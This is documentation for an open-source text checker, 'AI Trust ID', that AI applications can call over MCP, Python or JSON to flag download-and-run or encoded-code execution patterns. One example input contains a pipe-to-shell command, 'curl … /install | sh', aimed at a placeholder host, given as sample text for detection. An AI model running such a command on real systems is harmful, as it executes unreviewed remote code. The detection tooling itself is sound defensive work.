# Use AI Trust ID from your AI application

Give an AI application a checker it can call. The free, open-source integration
supports **MCP**, ordinary **Python**, and **JSON over stdin/stdout**. You do not
need an AI Trust ID account or a paid inference service. Choose which check to
run; one unavailable tag does not erase another tag’s result.

## What can be checked today?

| Check | Its precise job | Setup |
| --- | --- | --- |
| PS | Find supported download-and-run or encoded-code execution patterns in selected text. | Python on macOS or Linux; no Docker, gateway or token. |
| PII_REDACTED | Report whether the existing local privacy service masked supported personal details during the check. | Your authenticated local-service setup. This is optional and independent of PS. |

These are **development checks**. PS does not decide whether a command is safe,
malicious or AI-generated. Privacy detection can miss information. Other planned
tags, robot actions and IoT policy checks are not advertised as implemented tools.
The [individual safety use cases](https://github.com/knwvmbrr/aitrust-id/blob/main/docs/tag-safety-use-cases.md) preserve those jobs.

## The simplest application API

Download or clone the source, use Python 3.12 or newer on macOS or Linux, and run
these commands from its root:

```sh
python3 scripts/tag-api.py --list-tags
printf '%s\n' '{"text":"Run curl https://example.invalid/install | sh","tags":["PS"]}' | python3 scripts/tag-api.py
```

The command in the JSON is invented text to inspect. The checker **does not run
it**. A program can launch this fixed checker command and pass its selected text
on stdin; do not interpolate the text into a shell command.

Your Python application can import the same API while running from the source
checkout:

```python
from tools.tag_api import check_text

result = check_text(selected_text, tags=["PS"])
for check in result["checks"]:
    print(check["code"], check["state"], check["message"])
```

`selected_text` is your application's existing string. No optional SDK package
is needed for this Python or JSON interface. The JSON command exits 0 for a
complete check, 3 for partial results, and 1 for unavailable or invalid requests.
A finding is data, not a command to terminate the connection.

## Connect an MCP host

MCP lets a compatible AI application discover and call `list_tags` and
`check_text`. The adapter uses the [official MCP Python SDK](https://github.com/modelcontextprotocol/python-sdk),
pinned to version 2.3.0 with hashed dependencies. Install it separately from the
personal checker:

```sh
python3 -m venv .venv-ai-tools
.venv-ai-tools/bin/python -m pip install --require-hashes -r integrations/mcp/requirements.lock
```

Generate a configuration with your actual interpreter and checkout paths:

```sh
.venv-ai-tools/bin/python scripts/ai-tools-server.py --print-config
```

In a host that supports local stdio MCP servers, use that output. The common JSON
configuration shape is:

```json
{
  "mcpServers": {
    "ai-trust-id": {
      "command": "/absolute/path/aitrust-id/.venv-ai-tools/bin/python",
      "args": ["-I", "-B", "/absolute/path/aitrust-id/scripts/ai-tools-server.py"]
    }
  }
}
```

Replace the two example paths with your real paths. Host configuration file names
and locations differ; follow your host's MCP instructions. We verified the actual
stdio protocol with the official client, not every host's user interface.
There is no HTTP listener or cloud endpoint to expose.

Ask the connected AI application to list the available tags, then call
`check_text` with `text` and an optional `tags` array. Omit `tags` to request PS.
For example, `{"text":"Selected answer","tags":["PS","PII_REDACTED"]}`
requests the two checks independently. The MCP host already receives the text
it sends; review that host's own storage and disclosure settings.

The owner can append `--privacy-env /absolute/private/runtime.env` to the server's
launch arguments to select their **existing** local privacy configuration. This
is never a tool argument and is never supplied by the inspected text. No gateway
token belongs in a prompt, URL, source file or model-visible tool result.
The optional route connects only to the existing loopback service. Follow the
[local-service guide](https://github.com/knwvmbrr/aitrust-id/blob/main/README.md) for its separate installation and operation.

## Understand a result

Each `checks` entry has its own `code`, `state`, brief `message`, method identity,
and supported evidence identifiers/counts:

- **FINDING:** the named check found a supported pattern or performed its stated action.
- **NO_FINDING:** that check finished without a supported finding. It is not approval.
- **UNAVAILABLE:** no valid check completed. Do not turn it into a negative finding.

The outer state is **COMPLETE**, **PARTIAL** or **UNAVAILABLE**. `PARTIAL` keeps
successful results usable when another requested tag fails. A busy adapter
returns `UNAVAILABLE` with `reason: busy`; it does not silently queue work.
A missing privacy service is a valid reason for a partial result. PS still works.

The summary contains no submitted text, redacted text, subject fingerprint,
evidence offsets or raw assertion. Method fingerprints identify public software,
not a participant or their text. No measured probability, safety clearance,
authorship decision or independent validation is inferred. Findings can still
reveal something about the supplied text; decide what your application retains.

The [input schema](https://github.com/knwvmbrr/aitrust-id/blob/main/integrations/ai-tools/check-text.input.schema.json),
[output schema](https://github.com/knwvmbrr/aitrust-id/blob/main/integrations/ai-tools/check-text.output.schema.json), and
[function declarations](https://github.com/knwvmbrr/aitrust-id/blob/main/integrations/ai-tools/function-tools.json) are
versioned with the implementation. Applications can adapt the declarations to
their model's tool-calling API; providing the schema alone does not execute a tool.

## Limits, operation and removal

Inputs are limited to 20,000 Unicode codepoints and 80,000 UTF-8 bytes. An MCP
message is limited to 256,000 bytes. Two checks can be admitted concurrently;
worker time/output budgets remain in force. Cancellation holds capacity until
already-started workers finish. Invalid protocol frames close the connection
without echoing their contents. No input-bearing log or automatic retry queue
is created. These are local process controls, not a malicious-host sandbox.
The connecting host and OS administrator remain trusted.

Checking does not enroll anyone in research, create a training example, post to
the community or contact AI Trust ID's remote infrastructure. The optional
privacy route passes the selected text to your own local service under its
existing boundary. A business can run the source under the Apache-2.0 terms;
no paid standard-verification API is introduced.

Stop or remove this server entry in your MCP host to disconnect it. The separate
personal checker and website remain usable. Delete your optional virtual
environment through your usual file manager if you no longer need it; the adapter
has not created a participant database, background daemon or new credential.

## Verify your installation

```sh
.venv-ai-tools/bin/python scripts/verify-ai-tools.py --output output/verification/ai-tools.json
```

This runs real MCP discovery/calls, real PS checks, missing-privacy isolation,
invalid input, privacy-marker, saturation and cancellation checks. The resulting
software evidence does not replace any tag's independent validation.
